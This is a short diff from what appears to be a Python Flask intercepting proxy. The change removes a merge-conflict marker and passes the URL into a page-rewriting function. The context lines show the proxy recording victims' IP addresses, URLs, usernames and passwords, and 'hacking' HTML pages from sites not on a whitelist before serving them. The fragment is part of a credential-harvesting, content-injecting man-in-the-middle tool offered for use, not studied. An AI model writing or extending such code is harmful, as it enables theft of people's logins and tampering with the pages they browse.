@@ -125,10 +125,9 @@ def catch_all(path):
       # log that shit
       store_credentials(ip, url, u, p)
       return simple_rr(url, ip, u, p)
-<<<<<<< HEAD
   # hack the page if it's not on the whitelist and is actually HTML
   elif url.split("/")[2] not in whitelist and "text/html" in r.headers.get('content-type'):
-    return Response(hack(r.text))
+    return Response(hack(url, r.text))
   # else stream the content back
   return Response(stream_with_context(r.iter_content()), content_type = r.headers.get('content-type', "text/html"))
 
